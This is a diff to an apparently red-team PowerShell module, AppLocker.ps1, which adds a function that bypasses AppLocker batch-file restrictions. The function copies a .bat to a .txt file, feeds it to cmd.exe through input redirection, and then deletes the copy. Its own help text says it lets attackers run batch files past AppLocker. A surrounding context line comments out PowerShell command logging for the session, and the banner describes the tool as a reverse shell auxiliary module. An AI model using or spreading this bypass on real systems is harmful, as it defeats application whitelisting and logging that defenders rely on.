@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.1.5
+   PS cmdlet Dev version: v1.2.5
 
 .DESCRIPTION
    Applocker.ps1 module searchs in pre-defined directorys in %WINDIR%
@@ -35,7 +35,7 @@
    Accepts argument: Groups (List available Group Names)
 
 .Parameter TestBat
-   Accepts argument: TestBypass (Test bat exec applocker bypass)
+   Accepts argument: TestBypass (Test bat exec bypass) Or batch absoluct path
 
 .Parameter FolderRigths
    Accepts permissions: Modify, Write, FullControll, etc.
@@ -54,6 +54,9 @@
 .EXAMPLE
    PS C:\> .\AppLocker.ps1 -TestBat TestBypass
    Test for AppLocker Batch Script Execution Restriction bypass
+
+   PS C:\> .\AppLocker.ps1 -TestBat "$Env:TMP\applock.bat"
+   Execute applock.bat through text format bypass tecnic
 
 .EXAMPLE
    PS C:\> .\AppLocker.ps1 -GroupName "BUILTIN\Users" -FolderRigths "Write"
@@ -89,6 +92,19 @@
    [string]$TestBat="false",
    [string]$WhoAmi="false"
 )
+
+
+$Banner = @"
+
+             * Reverse TCP Shell Auxiliary Powershell Module *
+     _________ __________ _________ _________  o  ____      ____      
+    |    _o___)   /_____/|     O   \    _o___)/ \/   /_____/   /_____ 
+    |___|\____\___\%%%%%'|_________/___|%%%%%'\_/\___\_____\___\_____\   
+          Author: r00t-3xp10it - SSAredTeam @2021 - Version: $CmdletVersion
+            Help: powershell -File redpill.ps1 -Help Parameters
+
+      
+"@;
 
 
 ## Disable Powershell Command Logging for current session.
@@ -188,6 +204,7 @@ If($TestBat -ieq "TestBypass"){
    Clear-Host
    If(-not(Test-Path -Path "$Env:TMP\logfile.txt" -EA SilentlyContinue)){
 
+      Write-Host "$Banner" -ForegroundColor Blue
       Write-Host "`n`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
       Write-Host "--------------------------------------------------"
       Write-Host "[i] writting applock.bat to %tmp% folder"
@@ -203,7 +220,9 @@ If($TestBat -ieq "TestBypass"){
       Clear-Host
       If(-not(Test-Path -Path "$Env:TMP\logfile.txt" -EA SilentlyContinue)){
 
-         Write-Host "`n`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
+         Clear-Host
+         Write-Host "$Banner" -ForegroundColor Blue
+         Write-Host "`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
          Write-Host "--------------------------------------------------"
          Write-Host "[i] writting applock.bat to %tmp% folder"
          Write-Host "[i] trying to execute applock.bat script"
@@ -214,7 +233,9 @@ If($TestBat -ieq "TestBypass"){
 
       }Else{
 
-         Write-Host "`n`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
+         Clear-Host
+         Write-Host "$Banner" -ForegroundColor Blue
+         Write-Host "`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
          Write-Host "--------------------------------------------------"
          Write-Host "[i] writting applock.bat to %tmp% folder"
          Write-Host "[i] trying to execute applock.bat script"
@@ -232,7 +253,9 @@ If($TestBat -ieq "TestBypass"){
 
    }Else{
 
-      Write-Host "`n`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
+      Clear-Host
+      Write-Host "$Banner" -ForegroundColor Blue
+      Write-Host "`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
       Write-Host "--------------------------------------------------"
       Write-Host "[i] writting applock.bat to %tmp% folder"
       Write-Host "[i] trying to execute applock.bat script"
@@ -246,6 +269,82 @@ If($TestBat -ieq "TestBypass"){
    Write-Host "";exit ## Exit @AppLocker
 }
 
+If($TestBat -Match '\\'){
+
+   <#
+   .SYNOPSIS
+      Author: r00t-3xp10it
+      Helper - Execute Batch scripts through text format bypass technic
+
+   .DESCRIPTION
+      This function allow attackers to execute batch files bypassing applocker
+
+   .Parameter TestBat
+      Accepts the batch script absoluct \ relative path
+
+   .EXAMPLE
+      PS C:\> .\AppLocker.ps1 -TestBat "$Env:TMP\applocker.bat"
+      Execute applock.bat through text format bypass technic.
+
+   .OUTPUTS
+      AppLocker – Executing applock.bat script
+      ----------------------------------------
+      [+] found: C:\Users\pedro\Coding\applock.bat
+      [i] converting applock.bat to applock.txt
+      [i] trying to execute applock.txt text file
+      [+] script output :
+
+      Microsoft Windows [Version 10.0.18363.1440]
+      (c) 2019 Microsoft Corporation. Todos os direitos reservados.
+
+      C:\Users\pedro\Coding>@echo off
+      systeminfo|findstr "Host OS Type"|findstr /V "BIOS"
+
+      Host Name:                 SKYNET
+      OS Name:                   Microsoft Windows 10 Home
+      OS Version:                10.0.18363 N/A Build 18363
+      OS Manufacturer:           Microsoft Corporation
+      OS Configuration:          Standalone Workstation
+      OS Build Type:             Multiprocessor Free
+      System Type:               x64-based PC
+
+   #>
+
+   ## Local function variable declarations
+   # User Input: $TestBat = "$Env:USERPROFILE\Coding\applock.bat"
+   $RawName = $TestBat.Split('\')[-1]             ## applock.bat
+   $Bypassext = $RawName -replace 'bat','txt'     ## applock.txt
+   $RawFullPath = $TestBat -replace 'bat','txt'   ## C:\Users\pedro\Coding\applock.txt
+   $StripPath = $TestBat -replace "\\$RawName","" ## C:\Users\pedro\Coding
+
+   ## Make sure the user input file exists
+   If(-not(Test-Path -Path "$TestBat" -EA SilentlyContinue)){
+      Write-Host "`n`n[error] not found: $TestBat" -ForegroundColor Red -BackgroundColor Black
+      exit ## Exit @AppLocker
+   }
+
+   ## Build Output Table
+   Write-Host "`n`nAppLocker – Executing $RawName script" -ForegroundColor Green
+   Write-Host "----------------------------------------";Start-Sleep -Seconds 1
+   Write-Host "[+] found: $TestBat";Start-Sleep -Seconds 1
+
+   Write-Host "[i] converting $RawName to $Bypassext";Start-Sleep -Seconds 1
+   Copy-Item -Path "$TestBat" -Destination "$RawFullPath" -EA SilentlyContinue -Force
+
+   cd $StripPath
+   Write-Host "[i] trying to execute $Bypassext text file"
+   Start-Sleep -Seconds 1;Write-Host "script output:`n`n"
+   Start-Sleep -Seconds 1;cmd.exe /c "cmd.exe < $Bypassext"
+
+   cd $Working_Directory
+   ## Delete ALL artifacts left behind
+   If(Test-Path -Path "$RawFullPath"){
+      Remove-Item -Path "$RawFullPath" -Force
+   }
+
+Write-Host ""
+exit ## Exit @AppLocker
+}
 
 If($GroupName -ieq "false"){
     ## Get Group Name (BUILTIN\users) in diferent languages
